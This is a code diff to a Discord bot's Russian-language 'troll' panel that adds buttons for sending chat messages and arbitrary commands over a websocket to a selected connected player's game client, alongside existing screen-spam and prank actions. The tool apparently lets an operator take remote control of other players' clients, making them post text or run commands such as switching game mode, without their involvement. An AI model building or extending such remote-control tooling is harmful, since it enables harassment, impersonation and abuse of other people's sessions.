@@ -150,6 +150,36 @@ class SpamModal(discord.ui.Modal, title="Спам на экране"):
         await interaction.response.send_message(f"✅ Спам → `{player}` | `{self.message.value}` x{c}", delete_after=5)
 
 
+class ChatModal(discord.ui.Modal, title="Написать в чат"):
+    message = discord.ui.TextInput(label="Сообщение", max_length=256)
+
+    async def on_submit(self, interaction: discord.Interaction):
+        player = getattr(bot, "selected_player", None)
+        if not player or player not in connected_players:
+            await interaction.response.send_message("❌ Игрок не выбран!", delete_after=5)
+            return
+        if is_protected(player):
+            await interaction.response.send_message(f"🛡️ `{player}` защищён!", delete_after=5)
+            return
+        await connected_players[player]["ws"].send(f"chat:{self.message.value}")
+        await interaction.response.send_message(f"✅ Сообщение отправлено → `{player}`", delete_after=5)
+
+
+class CommandModal(discord.ui.Modal, title="Выполнить команду"):
+    command = discord.ui.TextInput(label="Команда (без /)", placeholder="gamemode creative", max_length=256)
+
+    async def on_submit(self, interaction: discord.Interaction):
+        player = getattr(bot, "selected_player", None)
+        if not player or player not in connected_players:
+            await interaction.response.send_message("❌ Игрок не выбран!", delete_after=5)
+            return
+        if is_protected(player):
+            await interaction.response.send_message(f"🛡️ `{player}` защищён!", delete_after=5)
+            return
+        await connected_players[player]["ws"].send(f"cmd:{self.command.value}")
+        await interaction.response.send_message(f"✅ Команда выполнена → `{player}`", delete_after=5)
+
+
 class TrollView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
@@ -210,7 +240,35 @@ class TrollView(discord.ui.View):
     async def extinguisher(self, interaction, button):
         await self.send_cmd(interaction, "extinguisher", "Огнетушитель!")
 
-    @discord.ui.button(label="🔄 Обновить список", style=discord.ButtonStyle.success, row=3)
+    @discord.ui.button(label="💬 Написать в чат...", style=discord.ButtonStyle.primary, row=3)
+    async def chat(self, interaction, button):
+        if not is_admin(interaction.user.id):
+            await interaction.response.send_message("❌ У тебя нет доступа!", delete_after=5)
+            return
+        player = getattr(bot, "selected_player", None)
+        if not player or player not in connected_players:
+            await interaction.response.send_message("❌ Сначала выбери игрока!", delete_after=5)
+            return
+        if is_protected(player):
+            await interaction.response.send_message(f"🛡️ `{player}` защищён!", delete_after=5)
+            return
+        await interaction.response.send_modal(ChatModal())
+
+    @discord.ui.button(label="⌨️ Выполнить команду...", style=discord.ButtonStyle.danger, row=3)
+    async def command(self, interaction, button):
+        if not is_admin(interaction.user.id):
+            await interaction.response.send_message("❌ У тебя нет доступа!", delete_after=5)
+            return
+        player = getattr(bot, "selected_player", None)
+        if not player or player not in connected_players:
+            await interaction.response.send_message("❌ Сначала выбери игрока!", delete_after=5)
+            return
+        if is_protected(player):
+            await interaction.response.send_message(f"🛡️ `{player}` защищён!", delete_after=5)
+            return
+        await interaction.response.send_modal(CommandModal())
+
+    @discord.ui.button(label="🔄 Обновить список", style=discord.ButtonStyle.success, row=4)
     async def refresh(self, interaction, button):
         if not is_admin(interaction.user.id):
             await interaction.response.send_message("❌ У тебя нет доступа!", delete_after=5)
